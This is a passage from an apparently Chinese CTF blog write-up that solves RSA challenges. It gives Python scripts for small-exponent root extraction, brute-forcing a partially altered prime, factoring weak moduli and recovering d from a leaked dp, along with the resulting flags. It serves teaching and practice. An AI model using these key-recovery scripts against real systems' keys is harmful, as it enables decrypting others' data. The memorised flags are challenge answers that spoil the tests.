    e <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
(mpz(30156321943599743278455918182580886589695285093075236154009535613), True)
b'INSA&#123;(I)NSA_W0uld_bE_pr0uD&#125;'
"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个m远小于n的情况下直接对c求e的次方根就有可能可以解出来这个m。</p>
<h4 id="INSHack2019-Yet-Another-RSA-Challenge-Part-1"><a href="#INSHack2019-Yet-Another-RSA-Challenge-Part-1" class="headerlink" title="[INSHack2019]Yet Another RSA Challenge - Part 1"></a>[INSHack2019]Yet Another RSA Challenge - Part 1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
import subprocess
p = subprocess.check_output('openssl prime -generate -bits 2048 -hex')
q = subprocess.check_output('openssl prime -generate -bits 2048 -hex')
flag = int('INSA&#123;REDACTED&#125;'.encode('hex'), 16)

N = int(p,16) * int(q,16)
print N
print '0x'+p.replace('9F','FC')
print pow(flag,65537,N)
"""</span>
<span class="token comment"># FC可能是9F，也可能是FC，爆破</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
np <span class="token operator">=</span> p<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'FC'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 共4个FC</span>
dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FC'</span><span class="token punctuation">,</span> <span class="token string">'9F'</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">getp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> a <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
        <span class="token keyword">for</span> b <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
            <span class="token keyword">for</span> c <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
                <span class="token keyword">for</span> d <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
                    p <span class="token operator">=</span> np<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> a <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> b <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> c <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> d <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>
                    p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
                    q <span class="token operator">=</span> n <span class="token operator">//</span> p
                    <span class="token keyword">if</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"I have got p:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">、q:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> p<span class="token punctuation">,</span> q


p<span class="token punctuation">,</span> q <span class="token operator">=</span> getp<span class="token punctuation">(</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># b'INSA&#123;I_w1ll_us3_OTp_n3xT_T1M3&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>部分替换，爆破一下即可得到p。ps：用在线的也行，但是考虑到线下没网，所以尽量使用脚本。</p>
<h3 id="一般rsa"><a href="#一般rsa" class="headerlink" title="一般rsa"></a>一般rsa</h3><h4 id="buu、rsa"><a href="#buu、rsa" class="headerlink" title="buu、rsa"></a>buu、rsa</h4><p>题目描述：ras是一个非常神秘的算法，那么它神秘在哪里 请少侠自己摸索！ 注意：得到的 flag 请包上 flag{} 提交</p>
<p>文件给出的是</p>
<p><img src="/2021/05/28/CTF/image-20210531094155238.png" alt="这两个文件"></p>
<p>？？？发生什么事了，这不是密码学的前几天做过的那个啥啥啥嘛。</p>
<p><a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptrsakeyparse">在线rsa公钥文件分解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ssleye.com/pub_asysi.html">在线rsa公钥文件分解2（n分解为十进制）</a></p>
<p>直接把pub.key文件内的内容复制到上面的网站内分解一下p、q、n。</p>
<p><img src="/2021/05/28/CTF/image-20210531094620593.png" alt="获得模数与指数"></p>
<p>再在线分解一下大整数n得下面的一些数据</p>
<pre class="line-numbers language-data" data-language="data"><code class="language-data">e &#x3D; 65537
n &#x3D; 86934482296048119190666062003494800588905656017203025617216654058378322103517
p &#x3D; 285960468890451637935629440372639283459
q &#x3D; 304008741604601924494328155975272418463<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>写下面得python脚本解密</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa
<span class="token keyword">import</span> gmpy2

e <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>
p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>
q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>

key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> encflag<span class="token punctuation">:</span>
    flag <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token comment"># b'flag&#123;decrypt_256&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ctfshow、crypto4"><a href="#ctfshow、crypto4" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求d</strong></p>
<p>给出条件如下</p>
<pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307
q&#x3D;2037
e&#x3D;17

求d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>写简单脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

p<span class="token operator">=</span><span class="token number">447685307</span>
q<span class="token operator">=</span><span class="token number">2037</span>
e<span class="token operator">=</span><span class="token number">17</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token comment"># 53616899001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ctfshow、crypto4-1"><a href="#ctfshow、crypto4-1" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求m</strong></p>
<p>给出条件如下</p>
<pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307
q&#x3D;2037
e&#x3D;17
c&#x3D;704796792<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>继续把上面的脚本完善一下就ok了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

p<span class="token operator">=</span><span class="token number">447685307</span>
q<span class="token operator">=</span><span class="token number">2037</span>
e<span class="token operator">=</span><span class="token number">17</span>
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token comment"># 53616899001</span>
c<span class="token operator">=</span><span class="token number">704796792</span>

n <span class="token operator">=</span> p <span class="token operator">*</span> q
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token comment"># 904332399012</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 看来m并不是任何有意义的信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ctfshow、babyrsa"><a href="#ctfshow、babyrsa" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有p、q、e、c</strong></p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537
p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179
q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501
c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接解</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> <span class="token number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span>
q <span class="token operator">=</span> <span class="token number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span>
c <span class="token operator">=</span> <span class="token number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span>

phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>

n <span class="token operator">=</span> p <span class="token operator">*</span> q
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;b4by_R5A&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ctfshow、babyrsa-1"><a href="#ctfshow、babyrsa-1" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有n、e、c</strong></p>
<p>先分解大整数n</p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537
n &#x3D; 1455925529734358105461406532259911790807347616464991065301847
c &#x3D; 69380371057914246192606760686152233225659503366319332065009

p &#x3D; 1201147059438530786835365194567<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

e <span class="token operator">=</span> <span class="token number">65537</span>
n <span class="token operator">=</span> <span class="token number">1455925529734358105461406532259911790807347616464991065301847</span>
c <span class="token operator">=</span> <span class="token number">69380371057914246192606760686152233225659503366319332065009</span>

p <span class="token operator">=</span> <span class="token number">1201147059438530786835365194567</span>
q <span class="token operator">=</span> n <span class="token operator">//</span> p
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>

m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;fact0r_sma11_N&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="ctfshow、easyrsa2"><a href="#ctfshow、easyrsa2" class="headerlink" title="ctfshow、easyrsa2"></a>ctfshow、easyrsa2</h4><p><strong>TAG: 简单rsa</strong></p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537
n &#x3D; 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747
c &#x3D; 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815
p &#x3D; 149751992878258417619955913803349588855907883795437275015624379454686823076475394292360761230383018058515386650339444595
246524276345367505681814522035068825010950620582957883108812048922184886717309007677307472277565963907119402324227023856
527902596769190955018836727291623263893333224367236239361837356140243

-------------------------------------------------------------------------------------------------------------------

e &#x3D; 65537
n &#x3D; 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711
c &#x3D; 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062
p &#x3D; 148629777091647844246796264243541316933219734934432518942362371402056651201924476622085034421034723763998765357939318936
167411912678961237019833852640423223833408458277374583926678987391357358691970765804588287101985728943684133878401175077
872266031328212861797034052872034250560671628711714389757777347537077<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个估计他的意思是让手搓的，但是在线的可以出来就也不手搓了。</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;m0_bv_hv_sv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上下两部分接出来的flag是相同的，更加确定了这个应该是让用脚本自己推出来m的，但是我懒得推，估计是与e有关的。</p>
<h4 id="ctfshow、easyrsa6"><a href="#ctfshow、easyrsa6" class="headerlink" title="ctfshow、easyrsa6"></a>ctfshow、easyrsa6</h4><p><strong>TAG: p、q相距很近</strong></p>
<p>看脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span>libnum
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

e <span class="token operator">=</span> <span class="token number">0x10001</span>
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>next_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token comment"># 上面p和q的生成过程说明p和q的相差应该时不大的</span>

n <span class="token operator">=</span> p <span class="token operator">*</span> q
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>
m <span class="token operator">=</span> libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>

<span class="token comment"># n = 26737417831000820542131903300607349805884383394154602685589253691058592906354935906805134188533804962897170211026684453428204518730064406526279112572388086653330354347467824800159214965211971007509161988095657918569122896402683130342348264873834798355125176339737540844380018932257326719850776549178097196650971801959829891897782953799819540258181186971887122329746532348310216818846497644520553218363336194855498009339838369114649453618101321999347367800581959933596734457081762378746706371599215668686459906553007018812297658015353803626409606707460210905216362646940355737679889912399014237502529373804288304270563</span>
<span class="token comment"># c = 18343406988553647441155363755415469675162952205929092244387144604220598930987120971635625205531679665588524624774972379282080365368504475385813836796957675346369136362299791881988434459126442243685599469468046961707420163849755187402196540739689823324440860766040276525600017446640429559755587590377841083082073283783044180553080312093936655426279610008234238497453986740658015049273023492032325305925499263982266317509342604959809805578180715819784421086649380350482836529047761222588878122181300629226379468397199620669975860711741390226214613560571952382040172091951384219283820044879575505273602318856695503917257</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个时候通过yafu还有那个在线的网站factordb.com应该都是可以解出p和q的</p>
<p>直接在线</p>
<pre class="line-numbers language-none"><code class="language-none">p &#x3D;163515803000813412334620775647541652549604895368507102613553057136855632963322853570924931001138446030409251690646645635800254129997200577719209532684847732809399187385176309169421205833279943214621695444496660249881675974141488357432373412184140130503562295159152949524373214358417567189638680209172147385801<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;p&amp;q_4re_t00_c1o5ed&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="dp泄露"><a href="#dp泄露" class="headerlink" title="dp泄露"></a>dp泄露</h3><blockquote>
<p>dp的存在是为了在计算之中更加方便，取dp的公式为<code>dp = d % (p-1)</code></p>
<p>可以使用下面的脚本碰撞得出d</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getd</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> dp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> <span class="token punctuation">(</span>dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>
            y <span class="token operator">=</span> n <span class="token operator">%</span> x
            <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                p <span class="token operator">=</span> x
                <span class="token keyword">break</span>
    q <span class="token operator">=</span> n <span class="token operator">//</span> p
    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">%</span> phi
    <span class="token keyword">return</span> d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dp换成dq亦可以此法获得d。</p>
</blockquote>
<h4 id="WUSTCTF2020-dp-leaking-1s-very-d-angerous"><a href="#WUSTCTF2020-dp-leaking-1s-very-d-angerous" class="headerlink" title="[WUSTCTF2020]dp_leaking_1s_very_d@angerous"></a>[WUSTCTF2020]dp_leaking_1s_very_d@angerous</h4><p>给出数据为</p>
<pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537
n &#x3D; 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847
c &#x3D; 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869
dp &#x3D; 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>写个小脚本解密</p>
